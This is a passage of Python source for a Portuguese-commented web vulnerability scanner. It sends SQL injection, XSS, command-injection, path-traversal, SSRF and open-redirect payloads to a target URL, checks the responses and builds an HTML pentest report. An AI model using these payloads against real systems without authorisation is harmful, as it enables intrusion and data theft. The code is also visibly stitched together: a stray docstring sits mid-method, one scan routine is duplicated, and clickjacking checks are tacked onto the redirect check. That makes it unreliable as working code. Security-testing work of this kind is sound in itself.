                    type_, path, size = result
                    results.append((type_, path, size))
                    
                    if type_ in ['dir', 'file']:
                        print(f"{Fore.GREEN}[+] Found: {path} ({type_}, {size} bytes){Style.RESET_ALL}")
                        if type_ == 'dir':
                            found_dirs.add(path)
                        else:
                            found_files.add(path)
                    elif type_ == 'forbidden':
                        print(f"{Fore.YELLOW}[!] Forbidden: {path}{Style.RESET_ALL}")
                    elif type_ == 'unauthorized':
                        print(f"{Fore.YELLOW}[!] Unauthorized: {path}{Style.RESET_ALL}")
        
        # Salva resultados detalhados
        detailed_results = []
        for type_, path, size in results:
            detailed_results.append({
                'path': path,
                'type': type_,
                'size': size,
                'url': f"{self.target_url}/{path}"
            })
        """Scanner básico de vulnerabilidades"""
        print(f"\n{Fore.YELLOW}[*] Iniciando scanner de vulnerabilidades{Style.RESET_ALL}")
        
        vuln_checks = [
            self.check_sql_injection,
            self.check_xss,
            self.check_command_injection,
            self.check_file_inclusion,
            self.check_idor,
            self.check_csrf,
            self.check_cors_misconfig,
            self.check_ssrf,
            self.check_open_redirect,
            self.check_clickjacking,
            self.check_subdomain_takeover,
            self.check_http_methods,
            self.check_insecure_cookies,
            self.check_sensitive_info,
            self.check_exposed_git,
            self.check_rate_limit
        ]
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for check in vuln_checks:
                future = executor.submit(self.run_vuln_check, check)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.logger.error(f"Erro em verificação: {e}")
        
        self.generate_vulnerability_report()
        return self.vulnerabilities
    
    def run_vuln_check(self, check_function):
        """Executa uma verificação de vulnerabilidade com tratamento de erros"""
        try:
            check_function()
        except Exception as e:
            self.logger.error(f"Erro em {check_function.__name__}: {e}")

    def vulnerability_scan(self, aggressive=False):
        """Executa o conjunto completo de verificações de vulnerabilidades"""
        print(f"\n{Fore.YELLOW}[*] Iniciando scanner de vulnerabilidades (aggressive={aggressive}){Style.RESET_ALL}")
        checks = [
            self.check_sql_injection,
            self.check_xss,
            self.check_command_injection,
            self.check_file_inclusion,
            self.check_idor,
            self.check_csrf,
            self.check_cors_misconfig,
            self.check_ssrf,
            self.check_open_redirect,
            self.check_clickjacking,
            self.check_subdomain_takeover,
            self.check_http_methods,
            self.check_insecure_cookies,
            self.check_sensitive_info,
            self.check_exposed_git,
            self.check_rate_limit
        ]

        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = {executor.submit(self.run_vuln_check, check): check for check in checks}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.logger.error(f"Erro em verificação: {e}")

        self.generate_vulnerability_report()
        return self.vulnerabilities
    
    def check_sql_injection(self):
        """Testa vulnerabilidades SQL Injection"""
        payloads = [
            "'", "\"", "`", "')", "\")", "`)",
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' AND 1=1--", "' AND 1=2--",
            "' OR SLEEP(5)--"
        ]
        
        # Testa em formulários
        forms = self.extract_all_forms()
        for form in forms:
            for payload in payloads:
                data = {}
                for input_field in form['inputs']:
                    if input_field['type'] in ['text', 'search', 'email', 'password', 'textarea', 'hidden']:
                        data[input_field['name']] = payload
                    else:
                        data[input_field['name']] = input_field.get('value', '')
                
                try:
                    if form['method'].upper() == 'GET':
                        response = self.session.get(form['action'], params=data, timeout=5, verify=False)
                    else:
                        response = self.session.post(form['action'], data=data, timeout=5, verify=False)
                    
                    if self.detect_sqli(response.text):
                        vuln = {
                            'type': 'SQL Injection',
                            'severity': 'HIGH',
                            'url': form['action'],
                            'method': form['method'],
                            'payload': payload,
                            'evidence': 'SQL error detected in response',
                            'response_text': response.text,
                            'recommendation': 'Use parameterized queries and prepared statements'
                        }
                        self.add_vulnerability(vuln)
                        break
                        
                except Exception as e:
                    continue
    
    def detect_sqli(self, response_text):
        """Detecta indicadores de SQL Injection"""
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"PostgreSQL.*ERROR",
            r"ORA-[0-9]{4,5}",
            r"Microsoft OLE DB",
            r"Unclosed quotation mark",
            r"Incorrect syntax near",
            r"unknown column",
            r"unknown table",
            r"Division by zero"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def check_xss(self):
        """Testa vulnerabilidades Cross-Site Scripting"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')"
        ]
        
        # Testa em formulários
        forms = self.extract_all_forms()
        for form in forms:
            for payload in xss_payloads:
                data = {}
                for input_field in form['inputs']:
                    if input_field['type'] in ['text', 'search', 'email', 'password', 'textarea', 'hidden']:
                        data[input_field['name']] = payload
                    else:
                        data[input_field['name']] = input_field.get('value', '')
                
                try:
                    if form['method'].upper() == 'GET':
                        response = self.session.get(form['action'], params=data, timeout=5, verify=False)
                    else:
                        response = self.session.post(form['action'], data=data, timeout=5, verify=False)
                    
                    if payload in response.text:
                        vuln = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'MEDIUM',
                            'url': form['action'],
                            'method': form['method'],
                            'payload': payload,
                            'evidence': 'Payload reflected in response',
                            'response_text': response.text,
                            'recommendation': 'Implement input validation and output encoding'
                        }
                        self.add_vulnerability(vuln)
                        break
                        
                except Exception as e:
                    continue
        
        # Testa em parâmetros URL
        test_params = ['q', 'search', 'id', 'page', 'name']
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    if payload in response.text:
                        vuln = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'MEDIUM',
                            'url': test_url,
                            'payload': payload,
                            'evidence': 'Payload reflected in URL parameter',
                            'response_text': response.text,
                            'recommendation': 'Implement input validation and output encoding'
                        }
                        self.add_vulnerability(vuln)
                except:
                    continue
    
    def check_command_injection(self):
        """Testa Command Injection"""
        payloads = [
            "; ls",
            "| ls",
            "& ls",
            "|| ls",
            "&& ls",
            "$(ls)",
            "; id",
            "| id",
            "& id",
            "`id`"
        ]
        
        # Testa em parâmetros GET
        test_params = ['cmd', 'command', 'exec', 'execute', 'ping', 'host', 'ip']
        for param in test_params:
            for payload in payloads:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    # Verifica por resultados de comandos
                    indicators = [
                        'root:', 'uid=', 'gid=', 'groups=',
                        'total ', 'drwx', '-rw-', 'Directory of',
                        'index.html', 'bin/', 'etc/', 'usr/',
                        'bin/bash', 'sh:'
                    ]
                    
                    for indicator in indicators:
                        if indicator in response.text:
                            vuln = {
                                'type': 'Command Injection',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'evidence': f'Command output found: {indicator}',
                                'response_text': response.text,
                                'recommendation': 'Use whitelist input validation and avoid shell commands'
                            }
                            self.add_vulnerability(vuln)
                            break
                except Exception as e:
                    continue
    
    def check_file_inclusion(self):
        """Testa File Inclusion"""
        payloads = [
            '../../../../../../../../etc/passwd',
            '../../../../../../../../etc/hosts',
            '../../../../../../../../windows/win.ini',
            '....//....//....//....//....//etc/passwd',
            '..\\..\\..\\..\\..\\..\\windows\\win.ini',
            'php://filter/convert.base64-encode/resource=index.php'
        ]
        
        test_params = ['file', 'page', 'path', 'dir', 'document', 'load']
        for param in test_params:
            for payload in payloads:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    # Verifica por conteúdo sensível
                    indicators = [
                        'root:', 'daemon:', 'bin:', 'sys:',
                        '[extensions]', '[fonts]', '[files]',
                        '<?php', 'mysql_connect'
                    ]
                    
                    for indicator in indicators:
                        if indicator in response.text:
                            vuln = {
                                'type': 'File Inclusion',
                                'severity': 'HIGH',
                                'url': test_url,
                                'payload': payload,
                                'evidence': f'Sensitive file content found: {indicator}',
                                'response_text': response.text,
                                'recommendation': 'Validate and sanitize file paths, use whitelists'
                            }
                            self.add_vulnerability(vuln)
                            break
                except Exception as e:
                    continue

    def check_idor(self):
        """Testa Insecure Direct Object References"""
        # Padrões comuns de IDs
        test_ids = ['1', '2', '3', '10', '100', '1000', 'admin', 'test', 'user']
        
        # Padrões de endpoints
        endpoint_patterns = [
            '/user/', '/profile/', '/account/', '/admin/',
            '/api/user/', '/api/profile/', '/api/account/',
            '/download/', '/file/', '/document/'
        ]
        
        for pattern in endpoint_patterns:
            for test_id in test_ids:
                test_url = f"{self.target_url}{pattern}{test_id}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        # Verifica se parece ser uma página de perfil/dados
                        profile_indicators = ['profile', 'account', 'user', 'settings', 'personal']
                        for indicator in profile_indicators:
                            if indicator in response.text.lower():
                                vuln = {
                                    'type': 'Insecure Direct Object Reference (IDOR)',
                                    'severity': 'MEDIUM',
                                    'url': test_url,
                                    'evidence': f'Accessible resource with ID: {test_id}',
                                    'recommendation': 'Implement proper access controls and authorization checks'
                                }
                                self.add_vulnerability(vuln)
                                break
                                
                except Exception as e:
                    continue
    
    def check_csrf(self):
        """Testa Cross-Site Request Forgery"""
        forms = self.extract_all_forms()
        
        for form in forms:
            # Verifica se form não tem token CSRF
            has_csrf_token = False
            for input_field in form['inputs']:
                if any(csrf_word in input_field['name'].lower() for csrf_word in ['csrf', 'token', 'nonce']):
                    has_csrf_token = True
                    break
            
            if not has_csrf_token and form['method'].upper() == 'POST':
                vuln = {
                    'type': 'Potential CSRF Vulnerability',
                    'severity': 'MEDIUM',
                    'url': form['action'],
                    'evidence': 'No CSRF token found in form',
                    'recommendation': 'Implement CSRF tokens and validate origin/referrer headers'
                }
                self.add_vulnerability(vuln)
    
    def check_cors_misconfig(self):
        """Testa CORS Misconfiguration"""
        try:
            # Faz requisição com Origin header
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(self.target_url, headers=headers, timeout=5, verify=False)
            
            if 'Access-Control-Allow-Origin' in response.headers:
                allow_origin = response.headers['Access-Control-Allow-Origin']
                
                if allow_origin == '*':
                    vuln = {
                        'type': 'CORS Misconfiguration',
                        'severity': 'MEDIUM',
                        'url': self.target_url,
                        'evidence': f'Wildcard CORS policy: {allow_origin}',
                        'recommendation': 'Restrict CORS to specific trusted origins'
                    }
                    self.add_vulnerability(vuln)
                elif allow_origin == 'https://evil.com':
                    vuln = {
                        'type': 'CORS Misconfiguration',
                        'severity': 'HIGH',
                        'url': self.target_url,
                        'evidence': f'Reflects arbitrary Origin: {allow_origin}',
                        'recommendation': 'Validate Origin header against whitelist'
                    }
                    self.add_vulnerability(vuln)
                    
        except Exception as e:
            self.logger.debug(f"Erro no teste CORS: {e}")
    
    def check_ssrf(self):
        """Testa Server-Side Request Forgery"""
        payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost/',
            'http://127.0.0.1/',
            'http://0.0.0.0/',
            'file:///etc/passwd'
        ]
        
        test_params = ['url', 'link', 'image', 'file', 'path', 'redirect']
        for param in test_params:
            for payload in payloads:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    # Verifica por conteúdo de metadados AWS/localhost
                    indicators = [
                        'ami-id', 'instance-id', 'local-ipv4',
                        'public-keys', 'security-groups',
                        'root:', 'localhost', '127.0.0.1'
                    ]
                    
                    for indicator in indicators:
                        if indicator in response.text:
                            vuln = {
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'HIGH',
                                'url': test_url,
                                'payload': payload,
                                'evidence': f'Internal resource accessed: {indicator}',
                                'response_text': response.text,
                                'recommendation': 'Validate and sanitize URLs, use allowlists'
                            }
                            self.add_vulnerability(vuln)
                            break
                            
                except Exception as e:
                    continue
    
    def check_open_redirect(self):
        """Testa Open Redirect"""
        payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'http://google.com'
        ]
        
        test_params = ['redirect', 'url', 'next', 'return', 'to', 'dest']
        for param in test_params:
            for payload in payloads:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    
                    if response.status_code in [301, 302, 307, 308]:
                        location = response.headers.get('Location', '')
                        if payload in location:
                            vuln = {
                                'type': 'Open Redirect',
                                'severity': 'LOW',
                                'url': test_url,
                                'payload': payload,
                                'evidence': f'Redirects to external site: {location}',
                                'response_headers': dict(response.headers),
                                'recommendation': 'Validate redirect URLs, use allowlists'
                            }
                            self.add_vulnerability(vuln)
                            break
                except Exception as e:
                    continue

        try:
            response = self.session.get(self.target_url, timeout=5, verify=False)
            
            x_frame_options = response.headers.get('X-Frame-Options', '')
            content_security_policy = response.headers.get('Content-Security-Policy', '')
            
            if not x_frame_options and 'frame-ancestors' not in content_security_policy.lower():
                vuln = {
                    'type': 'Clickjacking',
                    'severity': 'LOW',
                    'url': self.target_url,
                    'evidence': 'Missing X-Frame-Options or CSP frame-ancestors',
                    'recommendation': 'Implement X-Frame-Options or CSP with frame-ancestors directive'
                }
                self.add_vulnerability(vuln)
                
        except Exception as e:
            self.logger.debug(f"Erro no teste clickjacking: {e}")

    def check_subdomain_takeover(self):
        """Verifica possibilidade de Subdomain Takeover"""
        takeover_sigs = {
            'GitHub Pages': 'There isn\'t a GitHub Pages site here.',
            'Heroku': 'No such app',
            'AWS S3': 'The specified bucket does not exist',
            'Bitbucket': 'Repository not found',
            'Shopify': 'Sorry, this shop is currently unavailable.',
            'Tumblr': 'There\'s nothing here.',
            'Wordpress': 'Do you want to register',
            'Zendesk': 'Help Center Closed'
        }
        
        # Carrega subdomínios ativos
        subs_file = f"{self.output_dir}/loot/active_subdomains.txt"
        if not os.path.exists(subs_file):
            return
            
        with open(subs_file, 'r') as f:
            subdomains = [line.strip() for line in f.readlines()]
            
        for sub in subdomains:
            try:
                # Resolve CNAME first
                try:
                    resolver = dns.resolver.Resolver()
                    answers = resolver.resolve(sub, 'CNAME')
                    cname = str(answers[0])
                except:
                    continue
                    
                # Check HTTP response
                response = requests.get(f"http://{sub}", timeout=3, verify=False)
                
                for service, sig in takeover_sigs.items():
                    if sig in response.text:
                        vuln = {
                            'type': 'Subdomain Takeover',
                            'severity': 'CRITICAL',
                            'url': f"http://{sub}",
                            'evidence': f"CNAME: {cname}, Signature: {sig}",
                            'recommendation': f"Claim the subdomain on {service} or remove the DNS record."
                        }
                        self.add_vulnerability(vuln)
                        break
            except:
                continue

    def check_http_methods(self):
        """Verifica métodos HTTP permitidos e perigosos"""
        try:
            response = self.session.options(self.target_url, timeout=5, verify=False)
            allow = response.headers.get('Allow', '')
            dangerous = [m for m in ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH'] if m in allow]
            if dangerous:
                vuln = {
                    'type': 'Dangerous HTTP Methods Allowed',
                    'severity': 'MEDIUM',
                    'url': self.target_url,
                    'evidence': f'Allowed methods: {allow}',
                    'recommendation': 'Restrict allowed HTTP methods on the server'
                }
                self.add_vulnerability(vuln)
            # Also try TRACE explicitly
            try:
                trace_resp = self.session.request('TRACE', self.target_url, timeout=5, verify=False)
                if trace_resp.status_code == 200:
                    vuln = {
                        'type': 'TRACE Method Enabled',
                        'severity': 'LOW',
                        'url': self.target_url,
                        'evidence': 'TRACE returned 200',
                        'recommendation': 'Disable TRACE method on the server'
                    }
                    self.add_vulnerability(vuln)
            except:
                pass
        except Exception as e:
            self.logger.debug(f"Erro no cheque de métodos HTTP: {e}")

    def check_insecure_cookies(self):
        """Verifica se cookies importantes não possuem Secure/HttpOnly/SameSite"""
        try:
            resp = self.session.get(self.target_url, timeout=5, verify=False)
            set_cookie_headers = resp.headers.get('Set-Cookie')
            if set_cookie_headers:
                # se houver múltiplos cookies, separa por ', ' mas cuidado com datas em Expires
                cookies = re.split(r', (?=[^;]+?=)', set_cookie_headers)
                for c in cookies:
                    name = c.split('=')[0]
                    attrs = c.lower()
                    issues = []
                    if 'secure' not in attrs:
                        issues.append('Missing Secure')
                    if 'httponly' not in attrs:
                        issues.append('Missing HttpOnly')
                    if 'samesite' not in attrs:
                        issues.append('Missing SameSite')
                    if issues:
                        vuln = {
                            'type': 'Insecure Cookie Attributes',
                            'severity': 'LOW',
                            'url': self.target_url,
                            'evidence': f'Cookie {name} issues: {", ".join(issues)}',
                            'recommendation': 'Set Secure, HttpOnly and SameSite attributes for cookies'
                        }
                        self.add_vulnerability(vuln)
        except Exception as e:
            self.logger.debug(f"Erro no teste de cookies: {e}")

    def check_sensitive_info(self):
        """Procura chaves e segredos expostos em respostas públicas"""
        patterns = {
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'(?i)aws(.{0,20})?secret(.{0,20})?[:=]\s*[A-Za-z0-9/+=]{40}',
            'Slack Token': r'xox[baprs]-[A-Za-z0-9-]{10,}',
            'JWT Token': r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
            'Private Key': r'-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----'
        }
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file,'r') as f:
                urls = [line.strip() for line in f.readlines()][:200]  # limit
        else:
            urls = [self.target_url]
        for url in urls:
            try:
                r = self.session.get(url, timeout=5, verify=False)
                text = r.text
                for name, pat in patterns.items():
                    if re.search(pat, text):
                        vuln = {
                            'type': 'Sensitive Information Exposure',
                            'severity': 'HIGH' if name in ['AWS Secret Key','Private Key'] else 'MEDIUM',
                            'url': url,
                            'evidence': f'Found pattern: {name}',
                            'recommendation': 'Remove secrets from public repos and rotate compromised keys'
                        }
                        self.add_vulnerability(vuln)
            except:
                continue

    def check_exposed_git(self):
        """Verifica se repositório .git está exposto"""
        git_paths = ['/.git/HEAD', '/.git/config', '/.git/index', '/.env']
        for path in git_paths:
            try:
                r = self.session.get(self.target_url.rstrip('/') + path, timeout=5, verify=False, allow_redirects=False)
                if r.status_code == 200:
                    snippet = r.text[:200]
                    vuln = {
                        'type': 'Exposed Sensitive File',
                        'severity': 'HIGH' if '.env' in path or 'PRIVATE' in snippet.upper() else 'MEDIUM',
                        'url': self.target_url.rstrip('/') + path,
                        'evidence': snippet,
                        'recommendation': 'Remove sensitive files from webroot and restrict ACLs'
                    }
                    self.add_vulnerability(vuln)
            except:
                continue

    def check_rate_limit(self):
        """Testa comportamento de rate limiting com várias requisições rápidas"""
        endpoint = self.target_url
        responses = []
        try:
            for i in range(10):
                r = self.session.get(endpoint, timeout=5, verify=False)
                responses.append(r.status_code)
            if 429 in responses:
                vuln = {
                    'type': 'Rate Limiting Detected',
                    'severity': 'LOW',
                    'url': endpoint,
                    'evidence': '429 Too Many Requests observed when sending rapid requests',
                    'recommendation': 'Implement consistent rate limiting to prevent abuse'
                }
                self.add_vulnerability(vuln)
        except:
            pass

    def check_clickjacking(self):
        """Testa vulnerabilidade de Clickjacking (X-Frame-Options)"""
        try:
            r = self.session.get(self.target_url, timeout=5, verify=False)
            
            # Verifica headers de proteção contra clickjacking
            headers_to_check = ['X-Frame-Options', 'Content-Security-Policy']
            has_protection = False
            
            for header in headers_to_check:
                if header in r.headers:
                    header_value = r.headers.get(header, '')
                    if 'DENY' in header_value or 'SAMEORIGIN' in header_value or "frame-ancestors 'none'" in header_value:
                        has_protection = True
                        break
            
            if not has_protection:
                vuln = {
                    'type': 'Clickjacking (Missing X-Frame-Options)',
                    'severity': 'MEDIUM',
                    'url': self.target_url,
                    'evidence': 'Header X-Frame-Options não encontrado ou mal configurado',
                    'recommendation': 'Adicione X-Frame-Options: DENY ou SAMEORIGIN'
                }
                self.add_vulnerability(vuln)
                print(f"{Fore.YELLOW}[!] Clickjacking detectado - Header X-Frame-Options faltando{Style.RESET_ALL}")
        except Exception as e:
            self.logger.debug(f"Erro ao verificar Clickjacking: {e}")

    def generate_vulnerability_report(self):
        """Gera relatório de vulnerabilidades"""
        if not self.vulnerabilities:
            print(f"{Fore.YELLOW}[!] Nenhuma vulnerabilidade encontrada{Style.RESET_ALL}")
            return
        
        report = {
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'LOW'])
            },
            'vulnerabilities': self.vulnerabilities,
            'generated_at': datetime.now().isoformat(),
            'target': self.target_url
        }
        
        self.save_json(report, 'vulnerability_report.json')
        print(f"{Fore.GREEN}[+] Relatório de vulnerabilidades gerado: {len(self.vulnerabilities)} vulnerabilidades encontradas{Style.RESET_ALL}")
        
        return report
    
    # ==================== MÓDULO DE RELATÓRIOS ====================
    
    def generate_comprehensive_report(self):
        """Gera relatório completo"""
        print(f"{Fore.YELLOW}[*] Gerando relatório completo{Style.RESET_ALL}")
        
        # Coleta todos os dados disponíveis
        report_data = {
            'metadata': {
                'target': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'tool_version': '3.0',
                'scan_type': 'Comprehensive'
            },
            'reconnaissance': {
                'website_info': self.get_website_info(),
                'subdomains': list(self.discovered_subdomains),
                'dns_info': self.dns_enumeration(),
                'whois_info': self.whois_lookup(),
                'technologies': self.technology_fingerprinting(),
                'ssl_certificate': self.check_ssl_certificate(),
                'security_headers': self.check_security_headers(),
                'port_scan': self.advanced_port_scan()
            },
            'vulnerabilities': self.vulnerabilities if self.vulnerabilities else [],
            'directory_enumeration': self.directory_enumeration() if not self.discovered_files else {
                'files': self.discovered_files,
                'directories': []
            },
            'recommendations': self.generate_recommendations()
        }
        
        # Gera relatório HTML
        html_report = self.create_html_report(report_data)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_path = f"{self.output_dir}/reports/full_report_{timestamp}.html"
        
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html_report)
        
        # Salva também em JSON
        json_path = report_path.replace('.html', '.json')
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=4, default=str)
        
        print(f"\n{Fore.GREEN}[+] Relatórios gerados:{Style.RESET_ALL}")
        print(f"   HTML: {report_path}")
        print(f"   JSON: {json_path}")
        
        return report_path
    
    def create_html_report(self, data):
        """Cria relatório HTML formatado"""
        html_template = f"""
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Pentest Report - {data['metadata']['target']}</title>
            <style>
                :root {{
                    --critical: #dc3545;
                    --high: #fd7e14;
                    --medium: #ffc107;
                    --low: #28a745;
                    --info: #17a2b8;
                }}
                
                * {{ box-sizing: border-box; }}
                
                body {{
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 20px;
                    background: #f5f5f5;
                    color: #333;
                }}
                
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 20px rgba(0,0,0,0.1);
                }}
                
                .header {{
                    background: linear-gradient(135deg, #2c3e50 0%, #4a6491 100%);
                    color: white;
                    padding: 30px;
                    border-radius: 8px;
                    margin-bottom: 30px;
                }}
                
                .header h1 {{
                    margin: 0;
                    font-size: 2.5rem;
                }}
                
                .stats {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 30px 0;
                }}
                
                .stat-card {{
                    padding: 20px;
                    border-radius: 8px;
                    text-align: center;
                    color: white;
                    font-weight: bold;
                }}
                
                .stat-critical {{ background: var(--critical); }}
                .stat-high {{ background: var(--high); }}
                .stat-medium {{ background: var(--medium); }}
                .stat-low {{ background: var(--low); }}
                .stat-info {{ background: var(--info); }}
                
                .stat-number {{
                    font-size: 2.5rem;
                    margin: 10px 0;
                }}
                
                .vulnerability-list {{
                    margin: 30px 0;
                }}
                
                .vulnerability-item {{
                    margin: 15px 0;
                    padding: 20px;
                    border-left: 5px solid;
                    border-radius: 5px;
                    background: #f8f9fa;
                }}
                
                .vulnerability-critical {{ border-color: var(--critical); }}
                .vulnerability-high {{ border-color: var(--high); }}
                .vulnerability-medium {{ border-color: var(--medium); }}
                .vulnerability-low {{ border-color: var(--low); }}
                
                .severity-badge {{
                    display: inline-block;
                    padding: 5px 15px;
                    border-radius: 20px;
                    color: white;
                    font-weight: bold;
                    margin-right: 10px;
                }}
                
                .badge-critical {{ background: var(--critical); }}
                .badge-high {{ background: var(--high); }}
                .badge-medium {{ background: var(--medium); }}
                .badge-low {{ background: var(--low); }}
                
                .details {{
                    margin-top: 10px;
                    padding: 15px;
                    background: white;
                    border-radius: 5px;
                    border: 1px solid #ddd;
                }}
                
                table {{
                    width: 100%;
                    border-collapse: collapse;
                    margin: 20px 0;
                }}
                
                th, td {{
                    padding: 12px;
                    text-align: left;
                    border-bottom: 1px solid #ddd;
                }}
                
                th {{
                    background-color: #f2f2f2;
                }}
                
                .recommendations {{
                    background: #e8f4fd;
                    padding: 20px;
                    border-radius: 8px;
                    margin: 30px 0;
                    border-left: 5px solid var(--info);
                }}
                
                footer {{
                    text-align: center;
                    margin-top: 40px;
                    padding: 20px;
                    color: #666;
                    border-top: 1px solid #ddd;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔒 Relatório de Pentest</h1>
                    <p><strong>Alvo:</strong> {data['metadata']['target']}</p>
                    <p><strong>Data:</strong> {data['metadata']['scan_date']}</p>
                    <p><strong>Ferramenta:</strong> CyberForce Pentest Suite v{data['metadata']['tool_version']}</p>
                </div>
        """
        
        # Adiciona estatísticas
        vuln_count = len(data['vulnerabilities'])
        critical = len([v for v in data['vulnerabilities'] if v['severity'] == 'CRITICAL'])
        high = len([v for v in data['vulnerabilities'] if v['severity'] == 'HIGH'])
        medium = len([v for v in data['vulnerabilities'] if v['severity'] == 'MEDIUM'])
        low = len([v for v in data['vulnerabilities'] if v['severity'] == 'LOW'])
        
        html_template += f"""
                <div class="stats">
                    <div class="stat-card stat-critical">
                        <div class="stat-number">{critical}</div>
                        <div>Críticas</div>
                    </div>
                    <div class="stat-card stat-high">
                        <div class="stat-number">{high}</div>
                        <div>Altas</div>
                    </div>
                    <div class="stat-card stat-medium">
                        <div class="stat-number">{medium}</div>
                        <div>Médias</div>
                    </div>
                    <div class="stat-card stat-low">
                        <div class="stat-number">{low}</div>
                        <div>Baixas</div>
                    </div>
                    <div class="stat-card stat-info">
                        <div class="stat-number">{vuln_count}</div>
                        <div>Total</div>
                    </div>
                </div>
        """
        
        # Adiciona vulnerabilidades
        if vuln_count > 0:
            html_template += """
                <h2>⚠ Vulnerabilidades Encontradas</h2>
                <div class="vulnerability-list">
            """
            
            for vuln in data['vulnerabilities']:
                severity_class = vuln['severity'].lower()
                html_template += f"""
                    <div class="vulnerability-item vulnerability-{severity_class}">
                        <h3>
                            <span class="severity-badge badge-{severity_class}">{vuln['severity']}</span>
                            {vuln['type']}
                        </h3>
                        <p><strong>URL:</strong> {vuln.get('url', 'N/A')}</p>
                        <p><strong>Método:</strong> {vuln.get('method', 'N/A')}</p>
                        
                        <div class="details">
                            <p><strong>Evidência:</strong> {vuln.get('evidence', 'N/A')}</p>
                            <p><strong>Payload:</strong> <code>{vuln.get('payload', 'N/A')}</code></p>
                            <p><strong>Recomendação:</strong> {vuln.get('recommendation', 'N/A')}</p>
                        </div>
                    </div>
                """
            
            html_template += "</div>"
        else:
            html_template += """
                <div style="text-align: center; padding: 40px; background: #d4edda; border-radius: 8px;">
                    <h2>🎉 Nenhuma vulnerabilidade encontrada!</h2>
                    <p>O scanner não encontrou vulnerabilidades críticas no alvo.</p>
                </div>
            """
        
        # Adiciona recomendações
        recommendations = data.get('recommendations', [])
        if recommendations:
            html_template += """
                <h2>💡 Recomendações de Segurança</h2>
                <div class="recommendations">
                    <ul>
            """
            
            for rec in recommendations[:10]:  # Limita a 10 recomendações
                html_template += f"<li style='margin-bottom: 10px;'>{rec}</li>"
            
            html_template += """
                    </ul>
                </div>
            """
        
        # Informações técnicas
        html_template += """
                <h2>🔧 Informações Técnicas</h2>
                <table>
                    <tr>
                        <th>Tipo</th>
                        <th>Detalhes</th>
                    </tr>
        """
        
        if data.get('reconnaissance', {}).get('website_info'):
            info = data['reconnaissance']['website_info']
            html_template += f"""
                    <tr>
                        <td>Servidor</td>
                        <td>{info.get('server', 'N/A')}</td>
                    </tr>
                    <tr>
                        <td>Tecnologias</td>
                        <td>{', '.join(info.get('technologies', []))}</td>
                    </tr>
                    <tr>
                        <td>Status Code</td>
                        <td>{info.get('status_code', 'N/A')}</td>
                    </tr>
            """
        
        if data.get('reconnaissance', {}).get('subdomains'):
            subs = data['reconnaissance']['subdomains']
            html_template += f"""
                    <tr>
                        <td>Subdomínios</td>
                        <td>{len(subs)} encontrados</td>
                    </tr>
            """
        
        html_template += """
                </table>
                
                <footer>
                    <p>Relatório gerado por CyberForce Pentest Suite</p>
                    <p><strong>⚠ Este relatório é confidencial e deve ser tratado como sensível</strong></p>
                    <p>Para fins educacionais e testes autorizados apenas</p>
                </footer>
            </div>
        </body>
        </html>
        """
        
        return html_template
    
    def generate_recommendations(self):
        """Gera recomendações baseadas nas vulnerabilidades encontradas"""
        recommendations = []
        
        # Mapeamento de vulnerabilidades para recomendações
        vuln_recommendations = {
            'SQL Injection': [
